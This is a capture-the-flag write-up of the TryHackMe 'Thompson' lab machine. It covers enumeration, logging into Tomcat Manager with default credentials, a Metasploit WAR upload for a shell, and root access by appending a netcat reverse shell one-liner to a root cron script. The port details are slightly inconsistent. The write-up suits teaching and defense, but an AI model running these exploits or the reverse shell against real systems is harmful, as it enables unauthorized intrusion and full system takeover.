# CTF Write-up: Thompson — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Thompson |
| **Difficulty** | Easy |
| **Tags**       | `Apache Tomcat` `AJP13` `Default Credentials` `Cron` `PrivEsc` |

---

## Introduction

Thompson is a beginner-friendly Linux machine on TryHackMe that walks you through a very realistic attack chain — from service enumeration, to exploiting a misconfigured Apache Tomcat manager with default credentials, all the way up to root via a writable cron job script. It's a great machine for practising the basics of web exploitation and Linux privilege escalation.

Let's get into it.

---

## Step 1 — Reconnaissance (Nmap)

As always, the first thing I did was throw an Nmap scan at the target to get a feel for what's running on the box.

```bash
nmap -sC -sV -oN nmap_scan.txt <target-ip>
```

The scan came back with two interesting ports:

- **Port 8080** — HTTP server (Apache Tomcat)
- **Port 8009** — AJP/1.3 (Apache JServ Protocol)

Port 8009 immediately caught my eye. AJP13 has a well-known vulnerability (**CVE-2020-1938**, also called "Ghostcat") that allows reading files from the web application — but more on the exploitation path in a moment. The HTTP server on port 80 was the main target for initial access.

---

## Step 2 — Directory Enumeration (Gobuster)

With a web server confirmed, I ran Gobuster to brute-force hidden directories and find anything interesting.

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

Gobuster found two very telling paths:

- `/manager`
- `/host-manager`

These are the default administrative panels that ship with Apache Tomcat. Finding these exposed is a common misconfiguration, and they're a gold mine if the admin forgot to change the default credentials.

---

## Step 3 — Default Credentials

I navigated to `http://<target-ip>/manager` and was greeted with a basic auth prompt. Before trying anything fancy, I figured I'd check the classic Apache Tomcat default credential list. I referenced the repository at:

```
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
```

Sure enough, the credentials:

```
Username: tomcat
Password: s3cret
```

...worked perfectly on both `/manager` and `/host-manager`. Just like that, we had authenticated access to the Tomcat Manager — which means we can deploy WAR files. And deploying WAR files means Remote Code Execution (RCE).

Lesson learned (for defenders): always, always change default credentials.

---

## Step 4 — Exploitation (Metasploit — Tomcat Manager Upload)

With manager access confirmed, I opened Metasploit and searched for a Tomcat upload exploit. Metasploit has a fantastic module for exactly this scenario — it crafts a malicious WAR file, uploads it through the manager panel, and gives us a shell.

```bash
msfconsole
```

Inside Metasploit:

```bash
use multi/http/tomcat_mgr_upload

set RHOSTS <target-ip>
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST <your-ip>
set LPORT 4444

run
```

The module did its thing — uploaded the malicious WAR, triggered it, and a Meterpreter shell popped open. We're in.

---

## Step 5 — User Flag

With a shell open, I started poking around to understand what user we were running as and where we had landed.

```bash
shell
whoami
pwd
```

I then moved to the home directory to look for users:

```bash
cd /home
ls
```

There was a user called "jack". I stepped into their directory:

```bash
cd jack
ls -la
```

And right there, `user.txt` was sitting in the open. A quick `cat` gave us the first flag.

```bash
cat user.txt
```

---

## Step 6 — Privilege Escalation (Cron Job Abuse)

Now it was time to go for root. I started with the usual PrivEsc checklist. First, I checked `/etc/passwd` to get an overview of the users on the system, then moved on to the crontab:

```bash
cat /etc/crontab
```

This is where things got interesting. There was a cron job running as root:

```
*  *  *  *  *   root   cd /home/jack && bash id.sh
```

Every single minute, root was executing `id.sh` from jack's home directory. The key question was — could we write to that file? I checked and yes, we could. That's game over for root.

I crafted a reverse shell one-liner using an online reverse shell generator and appended it to `id.sh`:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-ip> 1234 >/tmp/f" >> id.sh
```

I verified the contents of `id.sh` looked right:

```bash
cat id.sh
```

Then, on my attacking machine, I started a Netcat listener:

```bash
nc -nvlp 1234
```

Within a minute, the cron job fired. The script ran as root, and my listener caught the connection. A shell dropped — and running `id` confirmed it:

```
uid=0(root) gid=0(root) groups=0(root)
```

Root. Done.

---

## Step 7 — Root Flag

With a root shell in hand, I navigated straight to `/root`:

```bash
cd /root
cat root.txt
```

---

## Summary & Takeaways

The Thompson machine is a great reminder of how a small misstep can unravel an entire system. The attack chain here was clean and logical:

1. Nmap revealed an exposed Tomcat service with AJP13 running.
2. Gobuster uncovered the `/manager` and `/host-manager` admin panels.
3. Default credentials (`tomcat:s3cret`) gave us authenticated access.
4. Tomcat's WAR file deployment feature was abused for RCE via Metasploit.
5. A writable cron script running as root gave us full privilege escalation.

From a defensive perspective, the fixes are straightforward:

- Disable or restrict the Tomcat Manager panel from public access.
- Always change default credentials.
- Audit cron jobs — never let a root-owned cron job execute a world-writable script from a user's home directory.

Overall a fun and satisfying machine. Definitely recommended for anyone getting started with web exploitation and Linux PrivEsc.
